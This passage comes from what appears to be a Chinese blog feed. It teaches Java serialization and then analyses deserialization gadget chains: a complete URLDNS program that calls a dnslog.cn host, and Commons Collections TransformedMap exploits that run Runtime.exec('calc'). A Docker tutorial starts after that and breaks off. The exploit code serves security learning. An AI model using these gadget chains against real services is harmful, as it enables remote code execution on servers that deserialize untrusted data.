keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span><span class="token number">1L</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token string">"shulei"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token operator">+</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>编写实现序列化与反序列化Class</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SerializableTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Student</span> student<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//create a Student instance</span>        <span class="token function">serializeObj</span><span class="token punctuation">(</span>student<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">deserializeObj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serializeObj</span><span class="token punctuation">(</span><span class="token class-name">Student</span> student<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span><span class="token comment">//序列化</span>        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"test.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建一个文件输出流，文件名为test.cer</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建一个对象输出流，对象数据流中的数据将输出到文件输出流中</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>student<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将student这个object输入到文件输出流中</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭文件输出流和对象输出流，避免内存泄露</span>        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//序列化完成</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">deserializeObj</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"test.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建文件输入流，读取test.cer</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建对象输入流，将文件输入流里的数据输入对象输入流</span>        <span class="token class-name">Student</span> student <span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">Student</span><span class="token punctuation">)</span>objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//读取输入流中的对象，强制转换为Student类型，重构对象</span>        student<span class="token punctuation">.</span><span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//call方法</span>        <span class="token comment">//反序列化完成</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h4 id="externalizable接口">Externalizable接口</h4><ol type="1"><li><p>使用<code>Externalizable</code>来标识Class是可序列化的。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Externalizable</span> <span class="token keyword">extends</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">writeExternal</span><span class="token punctuation">(</span><span class="token class-name">ObjectOutput</span> out<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">readExternal</span><span class="token punctuation">(</span><span class="token class-name">ObjectInput</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ol type="1"><li><code>writeExternal()</code>和<code>readExternal()</code>分别替代了<code>writeObject()</code>和<code>readObject()</code>两个methods,开发者需要手动对数据进行序列化和反序列化，这意味着，我们可以<strong>选择性</strong>地序列化和反序列化某些属性，相比Serializable接口就更加的灵活了。</li></ol></li><li><p>编写Externalizable Class</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">XiaoXueSheng</span>  <span class="token keyword">implements</span> <span class="token class-name">Externalizable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">XiaoXueSheng</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//此无参数的构造方法必须存在</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">XiaoXueSheng</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token operator">=</span>age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">writeExternal</span><span class="token punctuation">(</span><span class="token class-name">ObjectOutput</span> out<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将name写入对象输出流和文件输出流</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">readExternal</span><span class="token punctuation">(</span><span class="token class-name">ObjectInput</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//从对象输入流中获取name</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3id="java反序列化漏洞之利用链分析集合4">Java反序列化漏洞之利用链分析集合(4)</h3><h4 id="urldns利用链">Urldns利用链</h4><ol type="1"><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">URLDNS</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 定义一个hashMap，key为URL,value为String</span>        <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://e3h66m.dnslog.cn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置我们触发dns查询的url</span>                <span class="token comment">// 下面在put前修改url的hashcode为非-1的值，put后将hashcode修改为-1</span>        <span class="token comment">// 1. 将url的hashCode字段设置为允许修改</span>        <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 2. 设置url的hashCode字段为任意不为-1的值</span>        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取hashCode的值，验证是否修改成功</span>        <span class="token comment">// 3. 将 url 放入 hashMap 中，右边参数随便写</span>        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token string">""</span> <span class="token operator">+</span>                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 4. 修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span>        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//序列化操作</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"out.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//反序列化，触发payload</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"out.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>java 1.8利用链</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token operator">-></span>readObject<span class="token class-name">HashMap</span><span class="token operator">-></span>putval 或 <span class="token class-name">HashMap</span><span class="token operator">-></span>hash<span class="token constant">URL</span><span class="token operator">-></span>hashCode<span class="token class-name">URLStreamHandler</span><span class="token operator">-></span>hashCode<span class="token class-name">URLStreamHandler</span><span class="token operator">-></span>getHostAddress    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre></li></ol><h5 id="ysoserial中的利用链">Ysoserial中的利用链</h5><ol type="1"><li>巧妙的SilentURLStreamHandler</li></ol><h4 id="apache-commons-collections-利用链">Apache Commons Collections利用链</h4><h5 id="commons-collections-1-transformedmap版本">Commons Collections1-TransformedMap版本</h5><ol type="1"><li><p>有限制的利用</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransformedMapExploit</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//首先创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span>        <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//构造input - 这里我们需要一个Runtime Object， 用Runtime.getRuntime()的返回值可以得到</span>        <span class="token class-name">Object</span> input <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//执行payload</span>        invokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>改进后的利用</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransformedMapExploit</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*        * 客户端构造payload，并序列化文件        * */</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//返回Runtime Class</span>                <span class="token comment">//获取getRuntime方法</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token comment">//call getRuntime方法得到Runtime实例</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token string">"anyContent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> myMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//malicious map</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> aClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//反射获取该类</span>        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> aConstructor <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取构造方法</span>        aConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//取消构造方法限制</span>        <span class="token class-name">Object</span> o <span class="token operator">=</span> aConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> myMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//传入参数和malicious map</span>        <span class="token comment">//序列化</span>        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"tm.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/*        * 服务端反序列化读取，并触发漏洞        * */</span>        <span class="token comment">//反序列化</span>        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"tm.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//触发漏洞</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker</title>
      <link href="/2023/12/09/docker/"/>
      <url>/2023/12/09/docker/</url>
      
        <content type="html"><![CDATA[<h3 id="注意事项-经验-tips">注意事项-经验-tips</h3><ol type="1"><li>确保tag正确才能pull成功</li></ol><h3 id="为什么使用docker">为什么使用Docker</h3><ul><li><p><a href="https://www.docker.com/">Docker</a>的出现让环境配置变得（或许）不再折磨。简单来说 Docker使用轻量级的<code>“容器”（container</code>）而不是整个操作系统去支持一个应用的配置。应用自身连同它的环境配置被打包为一个个<code>image</code> 可以自由运行在不同平台的一个个 container中，这极大地节省了所有人的时间成本。</p><p>Docker容器是轻量级、可移植的应用程序运行环境，它们包含了应用程序及其所有<strong>依赖项（例如操作系统、库、二进制文件</strong>等），并在任何基于Linux或Windows的主机上都可以运行。由于Docker容器是隔离的，它们可以同时运行<strong>多个应用程序</strong>，而不会相互干</p></li><li><p><a href="https://docs.docker.com/">Docker 官方文档</a></p></li></ul><h3 id="containerize-an-application">Containerize an application</h3><ul><li><p><strong>Get the app</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/docker/getting-started.git</code></pre></li><li><p><strong>Containerize an application | DockerDocumentation</strong></p><ol type="1"><li><p>使用CMD</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">1<span class="token punctuation">.</span>  cd getting startted\2<span class="token punctuation">.</span>  <span class="token function">type</span> nul > Dockerfile</code></pre></li><li><p>在Dockerfile中添加</p><pre class="language-docker" data-language="docker"><code class="language-docker"><span class="token comment"># syntax=docker/dockerfile:1</span>   <span class="token instruction"><span class="token keyword">FROM</span> node:18-alpine</span><span class="token instruction"><span class="token keyword">WORKDIR</span> /app</span><span class="token instruction"><span class="token keyword">COPY</span> . .</span><span class="token instruction"><span class="token keyword">RUN</span> yarn install --production</span><span class="token instruction"><span class="token keyword">CMD</span> [<span class="token string">"node"</span>, <span class="token string">"src/index.js"</span>]</span><span class="token instruction"><span class="token keyword">EXPOSE</span> 3000</span></code></pre></li><li><p>启动<strong>Docker desktop</strong>:运行守护进程</p></li><li><p><strong>build image</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. <span class="token builtin class-name">cd</span> app<span class="token punctuation">\</span><span class="token number">2</span>. <span class="token function">docker</span> build <span class="token parameter variable">-t</span> getting-started <span class="token builtin 